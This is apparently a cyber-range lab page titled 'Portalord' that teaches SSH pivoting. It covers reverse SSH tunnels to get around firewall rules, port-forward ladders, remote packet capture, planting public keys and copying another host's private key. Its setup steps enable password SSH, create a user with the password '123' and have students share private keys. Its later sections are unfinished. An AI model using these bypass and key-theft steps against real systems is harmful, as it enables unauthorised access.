---
layout: default
title: Portalord
---

# Portalord    

**Focus**: Multi-plexing

**Skill**: Remote ssh, key-exchange, localhost chaining

**Activity**: Develop pathways to machines inaccesible from your host machine  

<div style="text-align: center;">
  <img src="{{ 'classes/Portalord/portalord_banner_v2.png' | relative_url }}" alt="Portalord Logo" style="max-width: 80%; height: auto;">
</div>

---
# Part 1: Remote ssh by binding highport to blocked port
Use remote ssh to connect back to a localhost and get around ufw rules set up in the environment. This is helpful when firewall rules do not allow access to port 22 from the outside.


### On the ssh-closed-box (ubuntu)
Set up the ufw wirewalls to block all traffic to port 22
<div class="scroll-box">
sudo ufw deny 22
sudo ufw allow 23
sudo ufw enable
</div> 

Turn password authentication on for the ssh-closed-box.
<div class="scroll-box">
sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config && sudo systemctl restart ssh
</div> 

Create a file that is only accessable to an ssh session by setting a "read only by owner" 
<div class="scroll-box">
echo "insert a flag here" > /home/ubuntu/ssh_flag.txt
chmod 600 /home/ubuntu/ssh_flag.txt
</div> 

chmod permissions: Read (r=4), Write (w=2), Execute (x=1)

- first int is the owner

- second int is the group

- third int is others

so 600 = 4+2 for the owner and 0 for group and 0 for everyone else

Create a user that can only access telnet specific files
<div class="scroll-box">
sudo adduser teluser
</div>  

- select a simple password (123)

set limited permissions for teluser

<div class="scroll-box">
sudo nano /usr/local/bin/telnet_shell.sh
</div>  
Put the following restrictions on the telnet users /bin/bash:
<div class="scroll-box">
#!/bin/bash
echo "You have limited access."
echo "You may only use: ls, cat"
export PATH=/usr/bin
exec /bin/bash --restricted
</div> 

install and open telnet services
<div class="scroll-box">
sudo apt update && sudo apt install telnetd -y && sudo apt install openbsd-inetd -y
</div> 

## On the attacker-box
Install telnet if needed:
<div class="scroll-box">
sudo apt update && sudo apt install telnet -y
</div>   

Turn on your ability to reverse ssh with a password:
<div class="scroll-box">
sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config && sudo systemctl restart ssh
</div>  

Now telnet into the ssh-closed-box
<div class="scroll-box">
telnet x.x.x.x`
</div>  
Now bind a local high port to local 22:
<div class="scroll-box">
ssh -N -R 2222:localhost:22 kali@your.kali.ip.addr.
</div>  
-N means --no-shell, -R means:--remote-port-forward

If it appears to "hang" you have an open connection

Now from a differnt terminal on you kali localhost
<div class="scroll-box">
ssh -p2222 ubuntu@localhost
</div>  
What you are doing is connecting to your local port 2222, which has an open ssh session from the remote device. You are using that port 2222 to ssh to port 22 on the remote device which is only blocked at the firewall and not on the local machine. 

go and find your flag

# Part 2: Localhost ladders and Jumps 
Local port forwarding

using setting up portbinding from localhost to allows you to create tunnels ssh devices eg. ssh ubuntu@10.15.15.10 > localhost:20000 localhost:20000 ssh ubuntu@10.15.15.11 >localhost:20001

Step 1: Set up the environment that you will be laddering (at least two, so you will need a partner on the cyber.org range)
ubuntu 1: deny

sudo ufw deny from kali.1.ip.addr
sudo ufw deny from kali.2.ip.addr
sudo ufw enable

sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config && sudo systemctl restart ssh

ubuntu 2: allow
sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config && sudo systemctl restart ssh

kali 1: ladder
ssh -N -L 2223:localhost:22 ubuntu@al.lo.w.ip
- binds
- now ssh -p 2223 ubuntu@localhost #first step of the ladder
- ssh -N -L 2224:localhost:2223 ubuntu@de.ny.i.p

  
kali 2: jump

Step 2:
telnet to 

# 3 wireshark
3. combining mkfifo wireshark capture to remote capture from chain ssh localhost:20001 "sudo tcpdump [flags]" /capturefifo

# 4a rsakey gen
4a. using an rsa keygen to allow for access to device (rsa-keygen) 

4b. sharing the private key with teammates so they can also get into the device rapidly (this is both effective teamwork on the range and shows the dangers of sharing a private key) 

5. using a device to "pivot" from with an rsa.pub key on other device w/o password eg- ssh ubuntu@10.15.15.10 ubuntu@cyber_range $ ssh ubuntu@10.15.15.16 5b. tunneling all the way to an end of a chain and placing your rsa_pub key in the appropriate place to gain direct access 

6. getting access to the rsa_key on a device you are ssh in and copying it to your device to have their level of accesses.
7.
8. 7. using proxychains4 to use local tools on remote networks.
